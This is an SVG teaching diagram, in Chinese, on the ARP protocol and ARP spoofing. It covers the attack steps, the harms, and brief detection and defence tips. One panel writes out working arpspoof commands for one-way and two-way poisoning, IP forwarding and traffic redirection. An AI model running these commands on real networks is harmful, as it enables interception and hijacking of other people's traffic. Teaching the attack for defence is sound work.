<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 460" width="100%" font-family="PingFang SC, Microsoft YaHei, sans-serif">
  <rect width="1000" height="460" fill="#f8fafc"/>
  <text x="500" y="30" font-size="16" font-weight="bold" text-anchor="middle" fill="#1a202c">ARP 协议原理与 ARP 欺骗</text>

  <rect x="50" y="60" width="140" height="50" rx="8" fill="#bee3f8" stroke="#3182ce" stroke-width="2"/>
  <text x="120" y="92" font-size="11" text-anchor="middle" fill="#3182ce" font-weight="bold">① A 询问 B 的 MAC</text>

  <rect x="430" y="60" width="140" height="50" rx="8" fill="#c6f6d5" stroke="#38a169" stroke-width="2"/>
  <text x="500" y="92" font-size="11" text-anchor="middle" fill="#38a169" font-weight="bold">② B 广播回复</text>

  <rect x="810" y="60" width="140" height="50" rx="8" fill="#fefcbf" stroke="#b7791f" stroke-width="2"/>
  <text x="880" y="92" font-size="11" text-anchor="middle" fill="#b7791f" font-weight="bold">③ A 缓存 B 的 MAC</text>

  <line x1="190" y1="85" x2="425" y2="85" stroke="#3182ce" stroke-width="2"/>
  <line x1="570" y1="85" x2="805" y2="85" stroke="#38a169" stroke-width="2"/>

  <rect x="40" y="140" width="450" height="280" rx="12" fill="#fff5f5" stroke="#e53e3e" stroke-width="2"/>
  <text x="265" y="165" font-size="12" font-weight="bold" text-anchor="middle" fill="#822727">ARP 欺骗攻击</text>

  <text x="70" y="195" font-size="10" font-weight="bold" fill="#c53030">攻击原理：</text>
  <text x="70" y="215" font-size="9" fill="#2d3748">ARP 协议无认证机制，攻击者发送伪造 ARP 响应</text>
  <text x="70" y="235" font-size="9" fill="#2d3748">使目标认为攻击者的 MAC 对应其他 IP</text>

  <text x="70" y="265" font-size="10" font-weight="bold" fill="#805ad5">攻击步骤：</text>
  <text x="70" y="285" font-size="9" fill="#2d3748">第 1 步：监控局域网流量（混杂模式）</text>
  <text x="70" y="305" font-size="9" fill="#2d3748">第 2 步：向 A 发送"我是网关"的伪造 ARP</text>
  <text x="70" y="325" font-size="9" fill="#2d3748">第 3 步：向网关发送"我是 A"的伪造 ARP</text>
  <text x="70" y="345" font-size="9" fill="#2d3748">第 4 步：A 和网关的所有流量经过攻击者</text>

  <text x="70" y="375" font-size="10" font-weight="bold" fill="#dd6b20">危害：</text>
  <text x="70" y="395" font-size="9" fill="#2d3748">中间人攻击（MITM）· 流量窃听</text>
  <text x="70" y="415" font-size="9" fill="#2d3748">会话劫持 · 断网攻击（DoS）</text>

  <text x="70" y="440" font-size="10" font-weight="bold" fill="#38a169">检测：</text>
  <text x="70" y="445" font-size="9" fill="#2d3748">arp -a 查看 ARP 表 · 多个 IP 对应同一 MAC</text>

  <rect x="510" y="140" width="460" height="280" rx="12" fill="#f0fff4" stroke="#48bb78" stroke-width="2"/>
  <text x="740" y="165" font-size="12" font-weight="bold" text-anchor="middle" fill="#276749">Arpspoof 实战命令</text>

  <text x="540" y="195" font-size="10" font-weight="bold" fill="#c53030">基础用法：</text>
  <text x="540" y="215" font-size="9" fill="#2d3748">arpspoof -i eth0 -t 192.168.1.100 192.168.1.1</text>
  <text x="540" y="235" font-size="9" fill="#2d3748">-i: 网卡  -t: 目标IP  最后: 伪造IP</text>

  <text x="540" y="260" font-size="10" font-weight="bold" fill="#805ad5">双向欺骗：</text>
  <text x="540" y="280" font-size="9" fill="#2d3748">arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &</text>
  <text x="540" y="300" font-size="9" fill="#2d3748">arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &</text>

  <text x="540" y="325" font-size="10" font-weight="bold" fill="#dd6b20">开启 IP 转发：</text>
  <text x="540" y="345" font-size="9" fill="#2d3748">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</text>

  <text x="540" y="370" font-size="10" font-weight="bold" fill="#3182ce">流量重定向：</text>
  <text x="540" y="390" font-size="9" fill="#2d3748">redirector -i eth0 -m 00:11:22:33:44:55 -s 80 -d 8080</text>

  <text x="540" y="415" font-size="10" font-weight="bold" fill="#38a169">防御：</text>
  <text x="540" y="435" font-size="9" fill="#2d3748">静态 ARP 表 · 端口安全（DHCP Snooping）</text>
</svg>
